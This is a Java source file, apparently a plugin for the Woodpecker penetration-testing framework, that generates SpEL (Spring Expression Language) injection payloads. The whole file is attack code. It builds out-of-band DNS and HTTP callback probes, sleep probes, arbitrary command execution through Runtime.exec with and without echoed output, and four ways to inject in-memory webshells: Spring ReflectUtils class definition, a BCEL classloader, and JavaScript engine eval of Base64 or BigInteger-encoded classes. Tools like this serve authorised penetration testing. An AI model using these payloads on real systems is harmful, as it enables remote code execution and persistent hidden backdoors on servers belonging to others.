package me.gv7.woodpecker.plugin.exprs;

import me.gv7.woodpecker.plugin.IExpr;
import me.gv7.woodpecker.plugin.utils.MemShellClassFactory;
import me.gv7.woodpecker.plugin.utils.MemShellJSUtils;
import me.gv7.woodpecker.plugin.utils.Utils;

public class SpELExpr implements IExpr {
    private String _encoder = "none";

    @Override
    public void setEncoder(String encoder) {
        _encoder = encoder;
    }

    private String out(String text) {
        return Utils.encoder(text, _encoder);
    }

    @Override
    public String getName() {
        return "SpEL";
    }

    @Override
    public String[] genDnslog(String domain) {
        return new String[]{
                out("#{T(java.net.InetAddress).getByName('" + domain.replace("'", "''") + "')}")
        };
    }

    @Override
    public String[] genHttplog(String url) {
        return new String[]{
                out("#{T(org.springframework.web.client.RestTemplate).newInstance().headForHeaders('" + url.replace("'", "''") + "')}"),
                out("#{new java.net.URL('" + url.replace("'", "''") + "').getContent()}")
        };
    }

    @Override
    public String[] genSleep(int sec) {
        return new String[]{
                out("#{T(java.lang.Thread).sleep(" + (sec * 1000) + ")}")
        };
    }

    @Override
    public String[] genExec(String command) {
        return new String[]{
                out("#{T(java.lang.Runtime).getRuntime().exec('" + command.replace("'", "''") + "')}")
        };
    }

    @Override
    public String[] genExecWithEcho(String command) {
        return new String[]{
                out("#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('" + command.replace("'", "''") + "').getInputStream()).useDelimiter('/').next()}")
        };
    }

    @Override
    public String[] genMemShell(byte[] memShellClass) {
        try {
            return new String[]{
                    "[+] Spring反射组件方案：==>" + System.lineSeparator() + out(genSpringMemShell1(memShellClass)) + System.lineSeparator() + " <==",
                    "[+] BCEL方案：==>" + System.lineSeparator() + out(genSpringMemShell2(memShellClass)) + System.lineSeparator() + " <==",
                    "[+] JS-BASE64方案：==>" + System.lineSeparator() + out("#{new javax.script.ScriptEngineManager().getEngineByName('js').eval('" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BASE64).replace("'", "''") + "')}") + System.lineSeparator() + " <==",
                    "[+] JS-BigInteger方案：==>" + System.lineSeparator() + out("#{new javax.script.ScriptEngineManager().getEngineByName('js').eval('" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BIGINTEGER).replace("'", "''") + "')}") + System.lineSeparator() + " <=="
            };
        } catch (Exception ex) {
            return new String[]{
                    "class文件异常"
            };
        }
    }

    private String genSpringMemShell1(byte[] memShellClass) throws Exception {
        MemShellClassFactory classFactory = new MemShellClassFactory(memShellClass, MemShellClassFactory.BASE64);
        return "#{T(org.springframework.cglib.core.ReflectUtils).defineClass('" + classFactory.getClassName() + "',T(org.springframework.util.Base64Utils).decodeFromString('" + classFactory.getPayload() + "'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).newInstance()}";
    }

    private String genSpringMemShell2(byte[] memShellClass) throws Exception {
        MemShellClassFactory classFactory = new MemShellClassFactory(memShellClass, MemShellClassFactory.BCEL);
        return "#{new com.sun.org.apache.bcel.internal.util.ClassLoader(new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).loadClass('" + classFactory.getPayload() + "').newInstance()}";
    }
}
